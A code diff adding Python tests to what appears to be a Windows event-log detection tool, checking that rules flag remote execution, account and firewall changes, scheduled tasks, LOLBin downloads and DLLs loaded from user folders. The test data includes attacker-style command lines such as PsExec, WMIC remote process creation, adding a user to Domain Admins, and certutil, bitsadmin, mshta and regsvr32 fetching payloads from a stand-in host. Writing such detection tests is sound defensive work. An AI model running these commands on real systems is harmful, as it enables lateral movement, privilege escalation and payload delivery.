@@ -265,6 +265,77 @@ def test_run_key_strength_depends_on_what_it_starts():
         [("Strong", "Starts a DLL at logon (Run key)")]
 
 
+def command_findings(image, command):
+    """(check, strength) of every finding for one program run with this command line."""
+    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{c}", Image=image, CommandLine=command,
+                    ParentImage="C:\\Windows\\System32\\cmd.exe")]
+    return [(f["check"], f["strength"]) for f in run_checks(events)]
+
+
+SYS = "C:\\Windows\\System32\\"
+
+
+def test_remote_execution_is_weak():
+    fires = [("C:\\Tools\\PsExec64.exe", '"C:\\Tools\\PsExec64.exe" \\\\SRV-01 -s cmd /c ipconfig'),
+             (SYS + "wbem\\WMIC.exe", 'wmic /node:SRV-01 process call create "cmd /c calc"'),
+             (SYS + "winrs.exe", "winrs -r:SRV-01 cmd"),
+             (SYS + "sc.exe", "sc \\\\SRV-01 create upd binPath= C:\\x.exe"),
+             (SYS + "xcopy.exe", "xcopy /Y C:\\Tools\\a.exe \\\\SRV-01\\C$\\Windows\\Temp\\"),
+             (SYS + "net.exe", "net use \\\\SRV-01\\ADMIN$ /user:corp\\admin"),
+             (SYS + "WindowsPowerShell\\v1.0\\powershell.exe", "powershell Invoke-Command -ComputerName SRV-01 {hostname}")]
+    for image, command in fires:
+        assert ("remote_execution", "Weak") in command_findings(image, command), command
+    quiet = [(SYS + "wbem\\WMIC.exe", "wmic process list brief"),          # WMI on this computer
+             (SYS + "net.exe", "net use Z: \\\\FILES-01\\Shared"),          # a normal file share
+             (SYS + "robocopy.exe", "robocopy E:\\Export \\\\BACKUP-01\\Backups$ /MIR")]  # not an admin share
+    for image, command in quiet:
+        assert "remote_execution" not in [c for c, _ in command_findings(image, command)], command
+
+
+def test_access_changes_are_weak():
+    fires = [(SYS + "net.exe", "net user helpdesk **** /add"),
+             (SYS + "net1.exe", 'net1 localgroup "Administrators" helpdesk /add'),
+             (SYS + "net.exe", 'net group "Domain Admins" helpdesk /add /domain'),
+             (SYS + "netsh.exe", 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes')]
+    for image, command in fires:
+        assert ("access_change", "Weak") in command_findings(image, command), command
+    quiet = [(SYS + "net.exe", "net user helpdesk"),                       # only looks at an account
+             (SYS + "net.exe", 'net localgroup "Administrators"'),          # only lists the group
+             (SYS + "netsh.exe", "netsh advfirewall show allprofiles")]     # only reads the firewall
+    for image, command in quiet:
+        assert command_findings(image, command) == [], command
+
+
+def test_scheduled_task_and_windows_tool_downloads_are_weak():
+    assert ("scheduled_task", "Weak") in command_findings(
+        SYS + "schtasks.exe", 'schtasks /create /tn "Update" /tr C:\\x.exe /sc daily')
+    assert command_findings(SYS + "schtasks.exe", "schtasks /query /fo list") == []
+    downloads = [(SYS + "certutil.exe", "certutil -urlcache -split -f http://x.example/a.dat a.dat"),
+                 (SYS + "certutil.exe", "certutil -decode in.txt out.exe"),
+                 (SYS + "bitsadmin.exe", "bitsadmin /transfer job http://x.example/a.exe C:\\a.exe"),
+                 (SYS + "mshta.exe", "mshta http://x.example/page.hta"),
+                 (SYS + "regsvr32.exe", "regsvr32 /s /u /i:http://x.example/a.sct scrobj.dll")]
+    for image, command in downloads:
+        assert ("tool_download", "Weak") in command_findings(image, command), command
+    # curl is a real download tool; certutil reading a certificate is normal.
+    assert command_findings("C:\\Windows\\System32\\curl.exe", "curl -L -o gh.zip https://example.com/gh.zip") == []
+    assert command_findings(SYS + "certutil.exe", "certutil -dump cert.cer") == []
+
+
+def test_dll_from_a_user_folder_is_weak():
+    dll = "C:\\Users\\analyst\\AppData\\Roaming\\Tool\\update.dll"
+    assert ("dll_from_user_folder", "Weak") in command_findings(SYS + "rundll32.exe", f"rundll32.exe {dll},Start")
+    assert command_findings(SYS + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\shell32.dll,"
+                                                  "Control_RunDLL desk.cpl") == []
+
+
+def test_command_line_findings_carry_the_rule_tag():
+    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{w}", Image=SYS + "wbem\\WMIC.exe",
+                    CommandLine='wmic /node:SRV-01 process call create "cmd"')]
+    finding = run_checks(events)[0]
+    assert (finding["tactic"], finding["technique"]) == ("Execution", "T1047 Windows Management Instrumentation")
+
+
 def test_only_low_findings_never_make_malicious():
     weak = [{"strength": "Weak", "title": f"signal {n}"} for n in range(6)]
     assert make_verdict(weak)["label"] == "Suspicious"
